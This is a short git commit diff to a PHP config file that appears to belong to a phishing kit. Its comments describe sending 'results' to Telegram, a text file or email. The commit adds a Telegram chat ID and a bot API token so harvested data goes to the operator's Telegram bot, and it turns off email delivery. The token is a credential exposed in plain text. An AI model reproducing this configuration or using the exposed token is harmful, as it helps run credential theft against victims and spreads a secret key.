3586b968a6c5a3aa039d72a84638e428a7519357
johnblake03XXX <147738071+johnblake03XXX@users.noreply.github.com>
2023-10-12 11:36:46 -0400

    Update config.php

--- Inc/config.php
+++ Inc/config.php
@@ -4,9 +4,9 @@
 
 $saveintotxt="no"; // If you want to save in txt file put yes otherwise put no
 $sendtotelegram="yes"; // If You Want to result on Telegram put yes otherwise put no
-$chat_id = ""; // Your Telegram Chat ID
-$bot_url = ""; // Your Telegram Bot Api Key
-$sendtoemail="yes";// If you want to result on Email put yes otherwise put no
+$chat_id = "6150161996"; // Your Telegram Chat ID
+$bot_url = "6609364015:AAHTIIr8zP_KDRM41IB6R7k6E63qQjBLI6U"; // Your Telegram Bot Api Key
+$sendtoemail="no";// If you want to result on Email put yes otherwise put no
 $email = ""; // Your Email Here :)
 
 
